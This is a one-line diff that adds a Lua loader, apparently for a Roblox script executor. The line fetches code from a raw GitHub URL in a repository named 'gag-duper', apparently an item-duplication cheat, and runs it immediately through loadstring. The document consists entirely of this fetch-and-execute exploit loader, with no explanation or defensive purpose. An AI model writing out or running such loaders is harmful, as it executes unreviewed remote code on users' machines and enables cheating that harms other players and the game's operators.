@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TypesOul-cell/gag-duper/refs/heads/main/gag"))();
